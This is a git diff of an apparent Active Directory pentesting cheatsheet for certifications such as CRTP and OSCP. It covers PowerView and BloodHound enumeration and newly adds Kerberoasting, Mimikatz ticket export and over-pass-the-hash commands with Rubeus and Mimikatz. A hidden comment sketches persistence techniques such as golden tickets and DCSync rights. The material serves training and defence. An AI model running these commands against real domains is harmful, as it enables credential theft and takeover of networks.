@@ -1,21 +1,30 @@
 ---
-title: "AD Enumeration"
+title: "Active Directory Cheatsheet"
 date: 2022-06-12T00:36:33+05:30
 aliases:
     - /powerview-cheatsheet
+keywords:
+    - active directory cheatsheet
+    - crtp cheatsheet
+    - oscp cheatsheet
+    - oscp ad cheatsheet
 ---
 
-# AD Enumeration
+# Active Directory (AD) Cheatsheet
 
-This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.
+This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.
 
-If you are looking for Pentester Academy's CRTP specific cheatsheet, it is [here](/crtp-cheatsheet)
+This cheatsheet would help some certifications like [CRTP](https://www.pentesteracademy.com/activedirectorylab), [OSCP](https://www.offensive-security.com/pwk-oscp/), [PNPT](https://certifications.tcm-sec.com/pnpt/), and such.
 
 > Note: Only a subset of flags and switches, which are most commonly used, are shared. Best documentation is the code itself.
 
-> This is a living document. Last updated: 13 / June / 2022
+> This is a living document. Last updated: 19 / June / 2022
 
-## Get the Dog Out - SharpHound + BloodHound
+## Enumeration
+
+Initial and lateral movement enumeration
+
+### Get the Dog Out - SharpHound + BloodHound
 
 Let's have the dog sniff things out because automated enumeration is cool
 
@@ -49,7 +58,7 @@ Specify domain
 
 Next step would be to take this data and then feed it to BloodHound GUI to finally have some fun :)
 
-## Getting Hands Dirty - PowerView
+### Getting Hands Dirty - PowerView
 
 Let's have some fun ourselves with manual enumeration.
 
@@ -57,7 +66,7 @@ We will use PowerView and some net commands to perform enumeration manually.
 
 Assuming that latest PowerView script (master and dev are the same) has been loaded in memory.
 
-### Domain Enumeration
+#### Domain Enumeration
 
 Get basic information of the domain
 ``` powershell
@@ -89,7 +98,19 @@ Get DC IP
 nslookup <target_dc>
 ```
 
-### User Enumeration
+#### Forest Enumeration
+
+Get current forest
+``` powershell
+Get-Forest
+```
+
+Get a list of domains
+``` powershell
+Get-ForestDomain [-Forest <target>]
+```
+
+#### User Enumeration
 
 Get a list of users
 ``` powershell
@@ -130,7 +151,7 @@ Finding users who can be delegated
 Get-NetUser -AllowDelegation
 ```
 
-### Computer Enumeration
+#### Computer Enumeration
 
 Get a list of computers
 ``` powershell
@@ -147,7 +168,7 @@ Finding users who are AllowedToDelegateTo
 Get-NetComputer -TrustedToAuth
 ```
 
-### Group Enumeration
+#### Group Enumeration
 
 Get a list of groups in a domain
 ``` powershell
@@ -164,14 +185,14 @@ Get group membership
 Get-NetGroupMember [-GroupName 'group_name'] [-Recurse]
 ```
 
-### Share Enumeration
+#### Share Enumeration
 
 List shares user have access to
 ``` powershell
 Invoke-ShareFinder -CheckShareAccess -ErrorAction SilentlyContinue [-ComputerDomain <target_domain>]
 ```
 
-### ACL Enumeration
+#### ACL Enumeration
 
 Get resolved ACEs, optionally for a specific user/group and domain
 ``` powershell
@@ -183,12 +204,12 @@ Get interesting resolved ACLs
 Invoke-ACLScanner [-Domain <target_domain>] -ResolveGUIDS
 ```
 
-Get interesting resolved ACLs owned by specific object (ex. svcadmin)
+Get interesting resolved ACLs owned by specific object (ex. noobsec)
 ``` powershell
-Invoke-ACLScanner -ResolveGUIDS \| ?{$_.IdentityReference -match 'svcadmin'}
+Invoke-ACLScanner -ResolveGUIDS \| ?{$_.IdentityReference -match 'noobsec'}
 ```
 
-### Session Enumeration
+#### Session Enumeration
 
 Finding sessions on a computer
 ``` powershell
@@ -200,7 +221,7 @@ Get who is logged on locally where
 Get-LoggedOnLocal [-ComputerName <comp_name>]
 ```
 
-### User Hunting
+#### User Hunting
 
 Get list of machines where current user has local admin access
 ``` powershell
@@ -216,4 +237,67 @@ Find machines where current user has local admin access AND specific group sessi
 ``` powershell
 Invoke-UserHunter -CheckAccess
 ```
+
+## Lateral Movement
+
+### Kerberoasting
+
+To see existing tickets
+``` powershell
+klist
+```
+
+Remove all tickets
+``` powershell
+klist purge
+```
+
+#### PowerView 
+
+Request a kerberos service ticket for specified SPN.<br>
+By default output in Hashcat format
+``` powershell
+Request-SPNTicket -SPN "CIFS/target.domain.local" [-OutputFormat JTR]
+```
+
+#### Manually
+
+By doing it manually, ticket is generated, it requires to be extracted to crack the hash
+
+``` powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "CIFS/target.domain.local"
+```
+Dump the tickets out
+```
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
+Now, crack 'em
+
+### Over-Pass the Hash
+
+#### Rubeus
+``` powershell
+Rubeus.exe asktgt /user:USER < /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/opsec] /ptt
+```
+
+#### Mimikatz
+``` powershell
+sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe
+```
+<!--
+constrained + unconstrained deleg -> rubeus
+
+token impersonation
+
+## Post exploitation
+
+dumping various creds with mimikatz?
+
+## Persistence
+
+add yourself in admin-sdholder
+give yourself dc sync privs 
+golden ticket
+-->
 
